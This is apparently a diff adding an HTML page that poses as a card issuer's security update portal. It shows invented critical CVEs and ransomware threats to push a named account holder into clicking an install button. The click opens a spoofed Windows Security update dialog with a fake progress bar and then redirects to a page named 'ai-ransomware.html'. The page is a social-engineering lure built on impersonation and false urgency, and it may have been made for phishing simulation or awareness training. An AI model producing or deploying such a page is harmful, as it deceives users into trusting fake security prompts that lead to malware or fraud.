@@ -1,0 +1,236 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>OrionCard Security Update Portal</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  :root{--accent:#0d9488;--bg:#f4f6f8;--text:#0f1724}
+  body{font-family:"Segoe UI",Arial,sans-serif;background:var(--bg);margin:0;padding:28px;color:var(--text)}
+  .container{max-width:900px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 8px 28px rgba(2,6,23,0.06);overflow:hidden}
+  .header{background:linear-gradient(90deg,#dc2626,#991b1b);padding:24px;color:#fff}
+  .header h1{margin:0;font-size:24px;font-weight:800}
+  .header .sub{font-size:14px;color:#fecaca;margin-top:6px}
+  .body{padding:28px}
+  .alert{background:#fef2f2;border-left:4px solid #dc2626;padding:18px;margin-bottom:24px;border-radius:6px}
+  .vuln-summary{background:#fff7ed;border:1px solid #fed7aa;border-radius:8px;padding:20px;margin:20px 0}
+  .vuln-item{background:#fff;border:1px solid #e5e7eb;padding:14px;margin:10px 0;border-radius:6px}
+  .btn{display:inline-block;background:#dc2626;color:#fff;padding:16px 36px;text-decoration:none;border:none;cursor:pointer;font-weight:700;font-size:17px;border-radius:10px;box-shadow:0 4px 15px rgba(220,38,38,0.3);transition:all 0.2s}
+  .btn:hover{background:#b91c1c;transform:translateY(-2px);box-shadow:0 6px 20px rgba(220,38,38,0.4)}
+  .status-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;margin:24px 0}
+  .status-card{background:#f9fafb;border:1px solid #e5e7eb;padding:16px;border-radius:8px}
+  .status-label{font-size:13px;color:#64748b;margin-bottom:6px}
+  .status-value{font-size:16px;font-weight:700}
+  .critical{color:#dc2626}
+  
+  /* Windows 11 Overlay - ULTRA REALISTIC */
+  .win-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);z-index:99999;align-items:center;justify-content:center;animation:fadeIn 0.3s}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+  
+  .win-window{background:#f3f3f3;width:520px;border-radius:12px;box-shadow:0 24px 60px rgba(0,0,0,0.4);overflow:hidden;animation:scaleIn 0.3s}
+  @keyframes scaleIn{from{transform:scale(0.9)}to{transform:scale(1)}}
+  
+  .win-titlebar{background:#f3f3f3;height:32px;display:flex;align-items:center;padding:0 12px;border-bottom:1px solid #e0e0e0}
+  .win-icon{width:16px;height:16px;margin-right:8px;background:#0078d4;border-radius:3px}
+  .win-title{font-size:12px;flex:1;color:#1f1f1f;font-weight:400}
+  .win-controls{display:flex;gap:12px}
+  .win-btn{width:12px;height:12px;border-radius:50%;opacity:0.6}
+  .win-btn.close{background:#e81123}
+  .win-btn.min{background:#ffb900}
+  .win-btn.max{background:#00d458}
+  
+  .win-body{background:#ffffff;padding:32px}
+  .win-shield{width:64px;height:64px;margin:0 auto 20px;background:linear-gradient(135deg,#0078d4,#005a9e);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;box-shadow:0 4px 12px rgba(0,120,212,0.3)}
+  
+  .win-text{text-align:center;margin:20px 0}
+  .win-h1{font-size:18px;font-weight:600;color:#1f1f1f;margin:0 0 10px}
+  .win-p{font-size:14px;color:#616161;margin:0;line-height:1.5}
+  
+  .win-progress{width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin:28px 0 16px}
+  .win-progress-bar{height:100%;background:linear-gradient(90deg,#0078d4,#00bcf2);width:0%;transition:width 0.4s ease;border-radius:3px}
+  
+  .win-status{text-align:center;font-size:13px;color:#616161;margin:12px 0}
+  .win-percent{font-weight:600;color:#1f1f1f}
+  
+  .win-footer{border-top:1px solid #e0e0e0;padding:20px 32px;background:#f9f9f9;text-align:center}
+  .win-footer-text{font-size:12px;color:#707070;margin:0}
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🛡️ OrionCard Security Update Portal</h1>
+      <div class="sub">Critical Security Advisory • SEC-CVE-2025-47821</div>
+    </div>
+
+    <div class="body">
+      <div class="alert">
+        <p style="margin:0;font-weight:700;color:#991b1b;font-size:16px;">🚨 Critical Security Update Required</p>
+        <p style="margin:10px 0 0;color:#991b1b;">Four critical vulnerabilities detected in your account security software</p>
+      </div>
+
+      <p><strong>Account Information:</strong></p>
+      <p style="margin:8px 0;color:#64748b;">Account Holder: <strong style="color:#0f1724;">Andrew Charon</strong></p>
+      <p style="margin:8px 0;color:#64748b;">Account Number: <strong style="color:#0f1724;">****1234</strong></p>
+
+      <div class="status-grid">
+        <div class="status-card">
+          <div class="status-label">Current Version</div>
+          <div class="status-value">v12.4.1</div>
+          <div style="font-size:12px;color:#64748b;margin-top:4px;">Released: March 2025</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Latest Version</div>
+          <div class="status-value" style="color:#059669;">v12.7.3</div>
+          <div style="font-size:12px;color:#64748b;margin-top:4px;">Released: October 2025</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Security Status</div>
+          <div class="status-value critical">HIGH RISK</div>
+          <div style="font-size:12px;color:#dc2626;margin-top:4px;">14 Critical Patches Missing</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Last Security Scan</div>
+          <div class="status-value">127 days ago</div>
+          <div style="font-size:12px;color:#64748b;margin-top:4px;">Scan overdue</div>
+        </div>
+      </div>
+
+      <div class="vuln-summary">
+        <p style="margin:0 0 14px;font-weight:600;color:#0f172a;font-size:16px;">Critical Vulnerabilities Detected:</p>
+        
+        <div class="vuln-item">
+          <p style="margin:0;font-weight:600;font-size:14px;">CVE-2025-47821 - Authentication Bypass</p>
+          <p style="margin:6px 0 0;font-size:13px;color:#64748b;">CVSS 9.8 (CRITICAL) - Allows unauthorized account access</p>
+        </div>
+
+        <div class="vuln-item">
+          <p style="margin:0;font-weight:600;font-size:14px;">CVE-2025-47822 - Remote Code Execution</p>
+          <p style="margin:6px 0 0;font-size:13px;color:#64748b;">CVSS 9.6 (CRITICAL) - Enables malicious code execution</p>
+        </div>
+
+        <div class="vuln-item">
+          <p style="margin:0;font-weight:600;font-size:14px;">CVE-2025-47823 - Data Exfiltration</p>
+          <p style="margin:6px 0 0;font-size:13px;color:#64748b;">CVSS 9.2 (CRITICAL) - Allows extraction of sensitive data</p>
+        </div>
+
+        <div class="vuln-item">
+          <p style="margin:0;font-weight:600;font-size:14px;">CVE-2025-47824 - Encryption Downgrade</p>
+          <p style="margin:6px 0 0;font-size:13px;color:#64748b;">CVSS 8.9 (HIGH) - Forces weak encryption protocols</p>
+        </div>
+      </div>
+
+      <p style="font-weight:600;margin-top:24px;">Security Update Package v12.7.3 Includes:</p>
+      <ul style="line-height:1.8;color:#334155;">
+        <li>Comprehensive patches for all four critical vulnerabilities</li>
+        <li>Enhanced TLS 1.3 encryption with AES-256-GCM</li>
+        <li>Advanced behavioral threat detection and analysis</li>
+        <li>Real-time ransomware protection and data loss prevention</li>
+        <li>Zero-day exploit mitigation and sandbox isolation</li>
+        <li>Improved authentication protocols and session management</li>
+      </ul>
+
+      <p style="margin:24px 0;padding:16px;background:#fef2f2;border-left:4px solid #dc2626;border-radius:6px;font-size:14px;color:#991b1b;">
+        <strong>⚠️ Active Threat Environment:</strong> These vulnerabilities are currently being exploited by RansomHub and LockBit 4.0 groups. Over 1,200 financial accounts compromised in the past 30 days.
+      </p>
+
+      <div style="text-align:center;margin:32px 0">
+        <button class="btn" onclick="initiateUpdate()">Install Critical Security Update</button>
+        <p style="font-size:13px;color:#64748b;margin-top:14px;">Installation takes 3-5 minutes • Account remains functional during update</p>
+      </div>
+
+      <p style="font-size:13px;color:#64748b;text-align:center;margin-top:24px;">
+        For technical support: 1-800-555-0198 • Reference: SEC-CVE-2025-47821
+      </p>
+    </div>
+  </div>
+
+  <!-- Ultra-Realistic Windows 11 Update Overlay -->
+  <div class="win-overlay" id="winOverlay">
+    <div class="win-window">
+      <div class="win-titlebar">
+        <div class="win-icon"></div>
+        <div class="win-title">Windows Security</div>
+        <div class="win-controls">
+          <div class="win-btn min"></div>
+          <div class="win-btn max"></div>
+          <div class="win-btn close"></div>
+        </div>
+      </div>
+
+      <div class="win-body">
+        <div class="win-shield">🛡️</div>
+        
+        <div class="win-text">
+          <h1 class="win-h1">Installing security update</h1>
+          <p class="win-p" id="winMessage">Preparing to install update...</p>
+        </div>
+
+        <div class="win-progress">
+          <div class="win-progress-bar" id="winProgressBar"></div>
+        </div>
+
+        <div class="win-status">
+          <span class="win-percent" id="winPercent">0%</span> complete
+        </div>
+      </div>
+
+      <div class="win-footer">
+        <p class="win-footer-text">This might take a few minutes. Your device will restart when ready.</p>
+      </div>
+    </div>
+  </div>
+
+<script>
+function initiateUpdate(){
+  // Show Windows 11 overlay
+  document.getElementById('winOverlay').style.display = 'flex';
+  
+  let progress = 0;
+  const messages = [
+    'Preparing to install update...',
+    'Downloading update files...',
+    'Verifying digital signature...',
+    'Installing security patches...',
+    'Configuring Windows Defender...',
+    'Updating system files...',
+    'Optimizing security settings...',
+    'Finalizing installation...',
+    'Preparing restart...'
+  ];
+  
+  const progressBar = document.getElementById('winProgressBar');
+  const percentText = document.getElementById('winPercent');
+  const messageText = document.getElementById('winMessage');
+  let msgIndex = 0;
+  
+  const interval = setInterval(function(){
+    progress += Math.random() * 12 + 4;
+    
+    if(progress > 100){
+      progress = 100;
+      clearInterval(interval);
+      
+      // Change message to "Restarting..."
+      messageText.textContent = 'Restarting your device...';
+      
+      // Redirect to ransomware page
+      setTimeout(function(){
+        window.location.href = 'ai-ransomware.html';
+      }, 1500);
+    }
+    
+    progressBar.style.width = progress + '%';
+    percentText.textContent = Math.floor(progress) + '%';
+    
+    // Update message
+    const newIndex = Math.floor(progress / 11);
+    if(newIndex !== msgIndex && newIndex < messages.length){
+      msgIndex = newIndex;
+      messageText.textContent = messages[msgIndex];
+    }
+  }, 350);
+}
+</script>
+</body>
+</html>
